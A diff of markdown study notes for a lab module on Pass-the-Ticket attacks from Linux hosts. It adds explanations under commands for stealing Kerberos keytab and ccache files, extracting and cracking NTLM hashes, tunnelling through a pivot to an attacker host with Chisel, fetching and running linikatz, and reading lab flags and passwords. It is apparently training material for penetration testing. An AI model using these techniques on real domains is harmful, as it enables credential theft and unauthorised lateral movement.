@@ -1,12 +1,10 @@
-# 🐧 Pass the Ticket (PtT) — Linux
+# Pass the Ticket (PtT) — Linux
 
 > **Module Section:** 22 / 26 — Password Attacks
 
 ## Overview
 
-Linux machines can be **domain-joined** to Active Directory for centralized identity management. When this is the case (or when scripts use Kerberos for automation), a compromised Linux host becomes a **source of Kerberos tickets** we can abuse to impersonate users and move laterally.
-
-> 💡 A Linux machine does **not** need to be domain-joined to use Kerberos tickets — they may also live in keytab files used by scripts.
+Linux machines can be joined to Active Directory (AD) for centralized identity management. When a Linux host is compromised, it may hold Kerberos tickets that can be stolen and used to move laterally. A Linux machine does not even need to be domain-joined to have useful tickets — scripts often use keytab files for automated Kerberos authentication.
 
 ---
 
@@ -26,6 +24,7 @@ Ticket request flow is identical to Windows. Storage differs.
 ```bash
 KRB5CCNAME=FILE:/tmp/krb5cc_<uid>_<rand>
 ```
+> This environment variable tells Kerberos tools which ccache file to use. Set it before running impacket, smbclient, or evil-winrm to use the ticket you want.
 
 This variable points Kerberos-aware tools to the active ticket cache.
 
@@ -47,10 +46,11 @@ This variable points Kerberos-aware tools to the active ticket cache.
 ```bash
 ssh david@inlanefreight.htb@10.129.204.23 -p 2222
 ```
+> Connects via SSH using sssd format: `user@realm@host`. Port 2222 is the forwarded port to LINUX01 through MS01. Use david's password `Password2` when prompted.
 
 ---
 
-## 1️⃣ Identifying AD Integration
+## Identifying AD Integration
 
 ### `realm list` — Cleanest Check
 
@@ -63,24 +63,27 @@ inlanefreight.htb
   permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
   permitted-groups: Linux Admins
 ```
+> Shows the AD realm this host is joined to, what software handles authentication (sssd), and which users and groups are allowed to log in.
 
 ### Fallback: Check for SSSD / Winbind
 
 ```bash
 ps -ef | grep -i "winbind\|sssd"
 ```
+> Checks running processes for sssd (System Security Services Daemon) or winbind — both indicate AD integration. Either one present means the host authenticates against a domain.
 
 Presence of `sssd_be`, `sssd_nss`, or `winbindd` confirms AD integration.
 
 ---
 
-## 2️⃣ Finding Kerberos Tickets
+## Finding Kerberos Tickets
 
 ### A. Find Keytab Files
 
 ```bash
 find / -name '*keytab*' -ls 2>/dev/null
 ```
+> Searches the entire filesystem for files with "keytab" in the name and shows their permissions and owner. Check for world-readable or group-readable keytabs — those are immediately abusable.
 
 Example output:
 ```
@@ -95,6 +98,7 @@ crontab -l
 # and
 cat /path/to/script.sh
 ```
+> Lists scheduled cron jobs, then reads the script to find the keytab path and principal. Cron scripts that authenticate to AD always reference a keytab and call `kinit`.
 
 Typical pattern inside a script:
 
@@ -102,6 +106,7 @@ Typical pattern inside a script:
 kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos/.scripts/svc_workstations.kt
 smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass
 ```
+> Shows the standard pattern: kinit authenticates using the keytab, then smbclient uses the resulting TGT with `-k` (Kerberos) and `-no-pass`.
 
 ### B. Find ccache Files
 
@@ -109,6 +114,7 @@ smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass
 env | grep -i krb5       # Find current user's cache
 ls -la /tmp              # Find all users' caches
 ```
+> First command shows what ccache the current user is using. Second command lists `/tmp` where all user ccaches are stored by default — look for `krb5cc_*` files owned by other users.
 
 Default naming: `krb5cc_<uid>_<random>`
 
@@ -116,13 +122,14 @@ Default naming: `krb5cc_<uid>_<random>`
 
 ---
 
-## 3️⃣ Abusing Keytab Files
+## Abusing Keytab Files
 
 ### Inspect a Keytab — `klist`
 
 ```bash
 klist -k -t /opt/specialfiles/carlos.keytab
 ```
+> Lists the Kerberos principals (user accounts) stored in the keytab file, with timestamps. This tells you who you can impersonate using this keytab.
 
 ```
 KVNO Timestamp           Principal
@@ -141,6 +148,7 @@ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
 # Verify
 klist
 ```
+> Backs up the current ccache, then uses `kinit` with `-k` (keytab mode) and `-t` (keytab file path) to get a TGT for carlos. The realm must be uppercase. Run `klist` to confirm the new ticket is active.
 
 > ⚠️ `kinit` is **case-sensitive** — username lowercase, realm uppercase.
 
@@ -149,10 +157,11 @@ klist
 ```bash
 smbclient //dc01/carlos -k -c ls
 ```
+> Lists the carlos share on dc01 using Kerberos authentication (`-k`). No password needed — the TGT from `kinit` handles it. `-c ls` runs the list command non-interactively.
 
 ---
 
-## 4️⃣ Extracting Hashes from a Keytab
+## Extracting Hashes from a Keytab
 
 ### `keytabextract.py`
 
@@ -161,6 +170,7 @@ Extracts **NTLM + AES128 + AES256** hashes from 502-type keytab files.
 ```bash
 python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 ```
+> Extracts NTLM and AES hashes from the keytab file. The NTLM hash can be used for Pass-the-Hash or cracked offline. AES hashes can be used for OverPass-the-Hash.
 
 ```
 REALM           : INLANEFREIGHT.HTB
@@ -186,10 +196,11 @@ Upload NTLM hash to [crackstation.net](https://crackstation.net/). If it's a wea
 ```bash
 su - carlos@inlanefreight.htb
 ```
+> Switches to carlos's shell after cracking his NTLM hash to get the plaintext password. Use the cracked password when prompted.
 
 ---
 
-## 5️⃣ Abusing ccache Files
+## Abusing ccache Files
 
 ### Requirements
 - **Read access** to the ccache file (own it, or be root)
@@ -203,6 +214,7 @@ export KRB5CCNAME=/root/krb5cc_647401106_I8I133
 klist    # Confirms we are now 'julio'
 smbclient //dc01/C$ -k -c ls -no-pass
 ```
+> Copies julio's ccache file to a location you own, sets `KRB5CCNAME` to point to it, and verifies with `klist`. Then uses the ticket to list DC01's C$ share. `-no-pass` prevents a password prompt since Kerberos handles auth.
 
 ### Check Group Membership Before Using
 
@@ -210,19 +222,20 @@ smbclient //dc01/C$ -k -c ls -no-pass
 id julio@inlanefreight.htb
 # groups=...domain admins@inlanefreight.htb...
 ```
+> Checks which groups the user belongs to before using the ticket. Finding "domain admins" in the output means the ticket gives Domain Admin-level access.
 
-Finding a **Domain Admin** ccache in `/tmp` is a critical finding.
+Finding a Domain Admin ccache in `/tmp` is a critical finding.
 
 ---
 
-## 6️⃣ Using Linux Tools with Kerberos from Attack Host
+## Using Linux Tools with Kerberos from Attack Host
 
-When attacking from a host **not joined to the domain** (e.g., Kali), we need:
+When attacking from a host not joined to the domain (e.g., Kali), you need four things:
 
-1. **Network reachability** to KDC/DC
-2. **DNS resolution** (or hardcoded `/etc/hosts`)
-3. **Kerberos config** (`/etc/krb5.conf`)
-4. A valid **ccache** pointed to by `KRB5CCNAME`
+1. Network reachability to the KDC/DC
+2. DNS resolution (or hardcoded `/etc/hosts`)
+3. A Kerberos config file (`/etc/krb5.conf`)
+4. A valid ccache pointed to by `KRB5CCNAME`
 
 ### Step 1 — Hardcode `/etc/hosts`
 
@@ -243,17 +256,20 @@ On attack host (server side):
 ```bash
 sudo ./chisel server --reverse
 ```
+> Starts a Chisel reverse tunnel server on the attack host. The pivot (MS01) will call out to this.
 
 On MS01 (client side):
 ```cmd
 C:\htb> c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
 ```
+> Runs Chisel on the Windows pivot, connecting back to the attack host and creating a SOCKS5 proxy. After this, proxychains routes Kerberos traffic through the pivot.
 
 ### Step 3 — Set the ccache
 
 ```bash
 export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 ```
+> Points Kerberos tools at the transferred ccache file. Strip the `FILE:` prefix if the file has one — some tools don't handle it.
 
 > 💡 Strip the `FILE:` prefix if present — some tools don't handle it.
 
@@ -264,12 +280,14 @@ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 proxychains impacket-wmiexec dc01 -k
 # If prompted for password, also add -no-pass
 ```
+> Runs impacket-wmiexec through the SOCKS proxy using the cached Kerberos ticket (`-k`). Add `-no-pass` if it still prompts. Use the hostname, not the IP.
 
 **Evil-WinRM:**
 ```bash
 # First install the package
 sudo apt-get install krb5-user -y
 ```
+> Installs the Kerberos client utilities (`kinit`, `klist`, etc.) needed for ticket-based auth from the attack host. Swap the package name for your distro's equivalent if not Debian-based.
 
 Set realm in `/etc/krb5.conf`:
 ```ini
@@ -303,6 +321,7 @@ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 # Windows kirbi → Linux ccache
 impacket-ticketConverter julio.kirbi krb5cc_julio
 ```
+> Converts a Kerberos ticket between Linux ccache and Windows `.kirbi` formats. Direction is auto-detected from the input file. Swap the filenames for your actual ticket files.
 
 ### Import Converted .kirbi on Windows
 
@@ -310,6 +329,7 @@ impacket-ticketConverter julio.kirbi krb5cc_julio
 C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 C:\htb> klist
 ```
+> Injects the converted `.kirbi` ticket into the current Windows session with Rubeus, then `klist` confirms it. Swap the path for your converted ticket file.
 
 ---
 
@@ -327,6 +347,7 @@ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.
 chmod +x linikatz.sh
 ./linikatz.sh
 ```
+> Downloads and runs Linikatz to sweep the host for all Kerberos artifacts (ccache, keytab, SSSD cache, Samba secrets). Requires root. Results land in a `linikatz.*` output folder.
 
 ### What It Collects
 
@@ -422,6 +443,7 @@ cat ~/flag.txt                                     # → Gett1ng_Acc3$$_to_LINUX
 realm list
 # permitted-groups: Linux Admins
 ```
+> Lists the AD realm config — the `permitted-groups` line answers which group is allowed to log into this host.
 
 ---
 
@@ -448,6 +470,7 @@ wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/master/keytabextrac
 python3 keytabextract.py /tmp/carlos.keytab
 # NTLM HASH: a738f92b3c08b424ec2d99589a9cce60
 ```
+> Pulls the keytab to the attack host with SCP, downloads keytabextract.py, then dumps the NTLM/AES hashes from it. Swap the keytab path and SSH target for your environment.
 
 **Step 2 — Crack NTLM with hashcat:**
 
@@ -456,6 +479,7 @@ echo 'a738f92b3c08b424ec2d99589a9cce60' > /tmp/carlos.ntlm
 hashcat -m 1000 /tmp/carlos.ntlm /usr/share/wordlists/rockyou.txt
 # → Password5
 ```
+> Cracks the extracted NTLM hash with rockyou; `-m 1000` = NTLM. Swap the hash and wordlist for your target.
 
 **Step 3 — SSH as carlos:**
 
@@ -464,6 +488,7 @@ ssh -p 2222 carlos@inlanefreight.htb@10.129.88.10   # Password5
 cat ~/flag.txt   # → C@rl0s_1$_H3r3
 id   # ...,linux admins → privileged group
 ```
+> Logs in as carlos with the cracked password, reads his flag, and checks group membership with `id`. Swap the user/host for your target.
 
 ---
 
@@ -485,6 +510,7 @@ cat ~/.scripts/kerberos_script_test.sh
 # kinit svc_workstations -k -t .../svc_workstations.kt
 # smbclient //dc01/svc_workstations -k ... > script-test-results.txt
 ```
+> Inspects carlos's cron job and its referenced script to find the keytab path and principal it authenticates as. Always read cron-referenced scripts for `kinit -k -t` keytab paths.
 
 Pull the **`._all.kt`** version (contains RC4 → NTLM):
 
@@ -513,6 +539,7 @@ sudo -l
 sudo cat /root/flag.txt
 # → Ro0t_Pwn_K3yT4b
 ```
+> Checks sudo rights with `sudo -l` — `(ALL) ALL` means unrestricted root, so just `sudo cat` the root flag. Always run `sudo -l` after every pivot.
 
 ---
 
